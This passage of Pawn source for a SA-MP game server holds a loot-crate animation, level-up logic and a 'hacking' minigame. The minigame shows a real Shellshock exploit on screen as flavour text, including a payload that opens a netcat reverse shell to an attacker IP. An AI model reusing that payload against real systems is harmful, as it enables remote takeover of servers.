                PlayerPlaySound(playerid, 1135, 0.0, 0.0, 0.0);
            }
        }
    }

    new object = -1;
    foreach( Player, i )
    {
        if( objectid == StrikeObject[i] )
        {
            object = objectid;
        }
    }

    if( object != -1 )
    {
        new Float:objectPos[3];
        GetObjectPos( object, objectPos[0], objectPos[1], objectPos[2] );
        for( new created = 0; created < 11 ; created += 1 )
        {
            new Float:explosionPos[2];
            explosionPos[0] = objectPos[0]+random( 30 )-random( 6 );
            explosionPos[1] = objectPos[1]+random( 30 )-random( 6 );
            CreateExplosion( explosionPos[0], explosionPos[1], objectPos[2], 0, 20.0 );
        }
        defer secondStrike(objectPos[0], objectPos[1], objectPos[2]);
        DestroyObject( object );
    }

    return 1;
}

forward OpenCrate(playerid);
public OpenCrate(playerid)
{

    new Float:X,Float:Y,Float:Z,Float:begin=51*1.51200;
    GetPlayerPos(playerid,X,Y,Z);
    PlayerCaseX[playerid] = X;
    PlayerCaseOBJ[200][playerid] = CreateDynamicObject(19448, X+1.16767+5*playerid, Y+-0.08158, Z+highpos-8.56462,   0.00000, 0.00000, 0.00000);   SetDynamicObjectMaterial(PlayerCaseOBJ[200][playerid], 0, 1676, "wshxrefpump", "black64", 0xFFFFFFFF); 
    PlayerCaseOBJ[201][playerid] = CreateDynamicObject(19447, X+0.00000+5*playerid, Y+0.00000, Z+highpos-5.43388,   0.00000, 0.00000, 0.00000);    SetDynamicObjectMaterial(PlayerCaseOBJ[201][playerid], 0, 1675, "wshxrefhse", "duskyblue_128", 0xFFFFFFFF);
    PlayerCaseOBJ[202][playerid] = CreateDynamicObject(19447, X+0.00000+5*playerid, Y+0.00000, Z+highpos-10.19381,   0.00000, 0.00000, 0.00000);   SetDynamicObjectMaterial(PlayerCaseOBJ[202][playerid], 0, 1675, "wshxrefhse", "duskyblue_128", 0xFFFFFFFF);
    PlayerCaseOBJ[203][playerid] = CreateDynamicObject(19447, X+0.00090+5*playerid, Y+7.15430, Z+highpos-8.41380,   0.00000, 0.00000, 0.00000);    SetDynamicObjectMaterial(PlayerCaseOBJ[203][playerid], 0, 1675, "wshxrefhse", "duskyblue_128", 0xFFFFFFFF);
    PlayerCaseOBJ[204][playerid] = CreateDynamicObject(19447, X+0.00350+5*playerid, Y+-7.12040, Z+highpos-8.41380,   0.00000, 0.00000, 0.00000);   SetDynamicObjectMaterial(PlayerCaseOBJ[204][playerid], 0, 1675, "wshxrefhse", "duskyblue_128", 0xFFFFFFFF);
    PlayerCaseOBJ[205][playerid] = CreateDynamicObject(19087, X+0.6140+5*playerid, Y+0.00000, Z+highpos-7.13523,   0.00000, 0.00000, 0.00000);     SetDynamicObjectMaterial(PlayerCaseOBJ[205][playerid], 0, 16150, "ufo_bar", "GEwhite1_64", 0xFFFFFFFF);
    PlayerCaseOBJ[206][playerid] = CreateDynamicObject(19131, X+-0.11290+5*playerid, Y+2.01870, Z+highpos-9.22520,   0.00000, 10.00000, 0.00000);  SetDynamicObjectMaterialText(PlayerCaseOBJ[206][playerid], 0, "i", OBJECT_MATERIAL_SIZE_128x128,"Comic", 100, 1, 0xFF000000, 0xC0C0C0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    PlayerCaseOBJ[207][playerid] = CreateDynamicObject(19353, X+-0.0730+5*playerid, Y+0.5698, Z+highpos-9.2395,  0.00000,  10.00000, 0.00000);     SetDynamicObjectMaterialText(PlayerCaseOBJ[207][playerid], 0, "{000040}Unlocking Container...", OBJECT_MATERIAL_SIZE_512x512,"Arial",31,1,0x00000000,0x000000,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    PlayerCaseOBJ[208][playerid] = CreateDynamicObject(18762, X+ 0.36960+5*playerid, Y+0.00000, Z+highpos-9.15070,   10.00000, 90.00000, 90.00000);SetDynamicObjectMaterial(PlayerCaseOBJ[208][playerid] ,0, 8839, "vgsecarshow", "lightblue2_32", 0xFFFFFFFF);
    PlayerCaseOBJ[209][playerid] = CreateDynamicObject(19304, X+1.1192+5*playerid, Y+-71.026, Z+highpos-7.81800,   0.00000, 0.00000, 90.00000);
    SetPlayerCameraPos(playerid,X+-5.9000+5*playerid, Y+0.0000, Z+highpos-7.9852);
    SetPlayerCameraLookAt(playerid, X+0.6000+5*playerid, Y+0.0000, Z+highpos-7.9852);

    for(new i=0;i<100;i++)
    {
        PlayerCaseOBJ[i][playerid]=CreateDynamicObject(2258, 0,0,0,0,0,0);
        PlayerCaseOBJ[i+100][playerid]=CreateDynamicObject(2258, 0,0,0,0,0,0);
        AttachDynamicObjectToObject(PlayerCaseOBJ[i][playerid],PlayerCaseOBJ[209][playerid],(0.00000-begin)+(i*1.51200),0.50400, 0,   0.00000, 0.00000, 180.00000, 1);
        AttachDynamicObjectToObject(PlayerCaseOBJ[i+100][playerid],PlayerCaseOBJ[209][playerid],(0.00000-begin)+(i*1.51200),0.51400, -0.3,   0.00000, 0.00000, 180.00000, 1);
    }
    SpinInterval[playerid]=100;
    MoveDynamicObject(PlayerCaseOBJ[209][playerid],X+1.1192+5*playerid, Y+-71.026+1.51200, Z+highpos-7.81800,21);
    for(new i=0;i<100;i++)
    {
        new classitem = random(100);
        PlayerProb[playerid] = classitem;
        switch (classitem)
        {
            case  0..1:
            {
                switch(random(2))
                {
                    case 0:
                    {
                        if(i==2)
                        ReceivedItem[playerid]=1;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0, #INFERNUS ,  OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000, 0xFFFF00, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[1]  ,  OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                    default:
                    {
                        if(i==2)
                        ReceivedItem[playerid]=2;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0, #BULLET  ,  OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000, 0xFFFF00, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[2]  , OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                } 
            }
            case 2..13:
            {
                switch(random(2))
                {
                    case 0:
                    {
                        if(i==2)ReceivedItem[playerid]=3;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0, #LEVELUP2  ,   OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000,0xFF0000 , OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[3] ,   OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                    default:
                    {
                        if(i==2)ReceivedItem[playerid]=4;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0, #LEVELUP1  ,   OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000, 0xFF0000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[4] ,   OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                }
            }
            case 14..30:
            {
                switch(random(2))
                {
                    case 0:
                    {
                        if(i==2)ReceivedItem[playerid]=5;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i][playerid], 0, #RP10 ,   OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000, 0xFF00FF, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[5]  ,   OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                    default:
                    {
                        if(i==2)ReceivedItem[playerid]=6;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,#RP40 ,   OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000, 0xFF00FF, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[6]  ,   OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                }
            }
            case 31..50:
            {
                switch(random(2))
                {
                    case 0:
                    {
                        if(i==2)ReceivedItem[playerid]=7;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i][playerid], 0, #HIDDEN, OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000,0x1580EA , OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[7] , OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000,0x00000000 , OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                    default:
                    {
                        if(i==2)ReceivedItem[playerid]=8;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i][playerid], 0, #PREMIUMP10 , OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000,0x1580EA , OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0,CaseDrop[8] , OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000,0x00000000 , OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                }
            }
            case 51..99:
            {
                switch(random(2))
                {
                    case 0:
                    {
                        if(i==2)ReceivedItem[playerid]=9;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i][playerid], 0,#CASH650,  OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000, 0x808080, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0, CaseDrop[9] ,  OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                    default:
                    {
                        if(i==2)ReceivedItem[playerid]=10;
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i][playerid], 0,#CASH320 ,  OBJECT_MATERIAL_SIZE_128x128,"Webdings", 58, 0, 0xFF000000, 0x808080, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                        SetDynamicObjectMaterialText(PlayerCaseOBJ[i+100][playerid], 0, CaseDrop[10] ,  OBJECT_MATERIAL_SIZE_128x128,"Arial", 20, 1, 0xFF000000, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
                    }
                }
            }
        }
    }
    return 1;
}

respectCheck(playerid) {

    new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1;
    new expamount = nxtlevel*levelexp;
    if( PlayerInfo[ playerid ][ xRespekt ] >= expamount ) {
        format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
        GameTextForPlayer( playerid, globalstring, 5000, 1);
        PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
        PlayerPlayMusic( playerid );
        PlayerInfo[ playerid ][ xLevel ]++;
        SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
        PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
        PlayerInfo[ playerid ][ xRespekt ] = 0; 
        dajSkillPoen(playerid, 1);
    }
}

hackingTDCreate(playerid) {

    HackingTD[playerid][0] = CreatePlayerTextDraw(playerid, 162.916595, 94.592567, "box");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][0], 0.000000, 30.833332);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][0], 497.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][0], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][0], -1);
    PlayerTextDrawUseBox(playerid, HackingTD[playerid][0], 1);
    PlayerTextDrawBoxColor(playerid, HackingTD[playerid][0], 230);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][0], 1);

    HackingTD[playerid][1] = CreatePlayerTextDraw(playerid, 162.500076, 356.444519, "box");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][1], 0.000000, -0.166667);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][1], 497.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][1], -1);
    PlayerTextDrawUseBox(playerid, HackingTD[playerid][1], 1);
    PlayerTextDrawBoxColor(playerid, HackingTD[playerid][1], -1);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][1], 1);

    HackingTD[playerid][2] = CreatePlayerTextDraw(playerid, 162.500076, 373.555603, "box");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][2], 0.000000, -0.166667);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][2], 497.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][2], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][2], -1);
    PlayerTextDrawUseBox(playerid, HackingTD[playerid][2], 1);
    PlayerTextDrawBoxColor(playerid, HackingTD[playerid][2], -1378294017);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][2], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][2], 1);

    HackingTD[playerid][3] = CreatePlayerTextDraw(playerid, 303.750152, 355.925903, "ASUS");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][3], 0.400000, 1.600000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][3], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][3], -1);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][3], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][3], 1);

    HackingTD[playerid][4] = CreatePlayerTextDraw(playerid, 168.333328, 99.777755, "root> Pritiskaj SPACE za hakovanje");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][4], 0.270416, 1.154075);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][4], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][4], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][4], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][4], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][4], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][4], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][4], 1);

    HackingTD[playerid][5] = CreatePlayerTextDraw(playerid, 167.916641, 114.814781, "Starting shellshock.py .......");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][5], 0.270416, 1.154075);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][5], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][5], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][5], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][5], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][5], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][5], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][5], 1);

    HackingTD[playerid][6] = CreatePlayerTextDraw(playerid, 189.999984, 130.888839, "payload = '() { :; }; /bin/bash -c ""nc -v {} {} -e /bin/bash -i""'.format(args.remote, args.port)");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][6], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][6], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][6], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][6], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][6], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][6], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][6], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][6], 1);

    HackingTD[playerid][7] = CreatePlayerTextDraw(playerid, 189.999969, 143.333343, "if __name__ == '__main__':");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][7], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][7], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][7], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][7], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][7], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][7], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][7], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][7], 1);

    HackingTD[playerid][8] = CreatePlayerTextDraw(playerid, 201.666641, 155.777862, "parser = argparse.ArgumentParser(description=""Exploit shellshock vulnerability"")");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][8], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][8], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][8], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][8], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][8], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][8], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][8], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][8], 1);

    HackingTD[playerid][9] = CreatePlayerTextDraw(playerid, 201.666641, 165.629760, "parser.add_argument(""-t"", ""--target"", help=""Target IP"", required=True)");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][9], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][9], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][9], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][9], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][9], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][9], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][9], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][9], 1);

    HackingTD[playerid][10] = CreatePlayerTextDraw(playerid, 199.166625, 175.481674, " parser.add_argument(""-u"", ""--uri"",  help='Target URI', required=True)");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][10], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][10], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][10], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][10], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][10], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][10], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][10], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][10], 1);

    HackingTD[playerid][11] = CreatePlayerTextDraw(playerid, 201.249969, 186.370605, "parser.add_argument(""-r"", ""--remote"", help=""Attacker IP to connect back with a shell"", required=True)");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][11], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][11], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][11], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][11], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][11], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][11], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][11], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][11], 1);

    HackingTD[playerid][12] = CreatePlayerTextDraw(playerid, 201.249969, 196.222488, "parser.add_argument(""-p"", ""--port"", help=""Attacker port for using in reverse shell"", required=True)");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][12], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][12], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][12], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][12], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][12], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][12], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][12], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][12], 1);

    HackingTD[playerid][13] = CreatePlayerTextDraw(playerid, 201.249969, 212.815139, "args = parser.parse_args()");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][13], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][13], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][13], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][13], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][13], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][13], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][13], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][13], 1);

    HackingTD[playerid][14] = CreatePlayerTextDraw(playerid, 201.249938, 223.185516, "main()");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][14], 0.170416, 0.905186);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][14], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][14], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][14], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][14], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][14], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][14], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][14], 1);

    HackingTD[playerid][15] = CreatePlayerTextDraw(playerid, 169.166580, 247.555892, "Hacking complete.. Password is : 123456");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][15], 0.200416, 1.211111);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][15], 598.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][15], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][15], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][15], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][15], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][15], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][15], 1);

    HackingTD[playerid][16] = CreatePlayerTextDraw(playerid, 293.333374, 322.740722, "box");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][16], 0.000000, 1.874999);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][16], 290.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][16], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][16], -1);
    PlayerTextDrawUseBox(playerid, HackingTD[playerid][16], 1);
    PlayerTextDrawBoxColor(playerid, HackingTD[playerid][16], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][16], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][16], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][16], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][16], 1);

    HackingTD[playerid][17] = CreatePlayerTextDraw(playerid, 351.666534, 323.777801, "box");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][17], 0.000000, 1.708332);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][17], 348.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][17], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][17], -1);
    PlayerTextDrawUseBox(playerid, HackingTD[playerid][17], 1);
    PlayerTextDrawBoxColor(playerid, HackingTD[playerid][17], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][17], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][17], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][17], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][17], 1);

    HackingTD[playerid][18] = CreatePlayerTextDraw(playerid, 292.083343, 322.740814, "box");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][18], 0.000000, -0.250000);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][18], 348.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][18], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][18], -1);
    PlayerTextDrawUseBox(playerid, HackingTD[playerid][18], 1);
    PlayerTextDrawBoxColor(playerid, HackingTD[playerid][18], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][18], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][18], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][18], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][18], 1);

    HackingTD[playerid][19] = CreatePlayerTextDraw(playerid, 292.500000, 341.926147, "box");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][19], 0.000000, -0.250000);
    PlayerTextDrawTextSize(playerid, HackingTD[playerid][19], 348.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][19], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][19], -1);
    PlayerTextDrawUseBox(playerid, HackingTD[playerid][19], 1);
    PlayerTextDrawBoxColor(playerid, HackingTD[playerid][19], 8388863);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][19], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][19], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][19], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][19], 1);

    HackingTD[playerid][20] = CreatePlayerTextDraw(playerid, 302.500061, 325.333374, "FINISH");
    PlayerTextDrawLetterSize(playerid, HackingTD[playerid][20], 0.310416, 1.237037);
    PlayerTextDrawAlignment(playerid, HackingTD[playerid][20], 1);
    PlayerTextDrawColor(playerid, HackingTD[playerid][20], -1);
    PlayerTextDrawSetShadow(playerid, HackingTD[playerid][20], 0);
    PlayerTextDrawBackgroundColor(playerid, HackingTD[playerid][20], 255);
    PlayerTextDrawFont(playerid, HackingTD[playerid][20], 1);
    PlayerTextDrawSetProportional(playerid, HackingTD[playerid][20], 1);
    PlayerTextDrawSetSelectable(playerid, HackingTD[playerid][20], true);

    return 1;
}

HackingTDControl(playerid, number) {

    switch(number) {

        case 0: {

            for(new i = 0; i < 21; i++) {

                PlayerTextDrawHide(playerid, HackingTD[playerid][i]);
            }

            CancelSelectTextDraw(playerid);

            playerHacking[playerid] = 0;
            playerHackingSifra[playerid] = 0;

            TogglePlayerControllable(playerid, true);

            return 1;
        }

        case 2: {

            for(new i = 0; i < 5; i++) {

                PlayerTextDrawShow(playerid, HackingTD[playerid][i]);
            }

            playerHackingSifra[playerid] = 0;

            playerHacking[playerid] = 2;

            return 1;
        }

        case 3: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][5]);

            playerHacking[playerid] = 3;

            return 1;
        }

        case 4: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][6]);

            playerHacking[playerid] = 4;

            return 1;
        }

        case 5: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][7]);

            playerHacking[playerid] = 5;

            return 1;
        }

        case 6: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][8]);

            playerHacking[playerid] = 6;

            return 1;
        }

        case 7: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][9]);

            playerHacking[playerid] = 7;

            return 1;
        }

        case 8: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][10]);

            playerHacking[playerid] = 8;

            return 1;
        }

        case 9: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][11]);

            playerHacking[playerid] = 9;

            return 1;
        }

        case 10: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][12]);

            playerHacking[playerid] = 10;

            return 1;
        }

        case 11: {

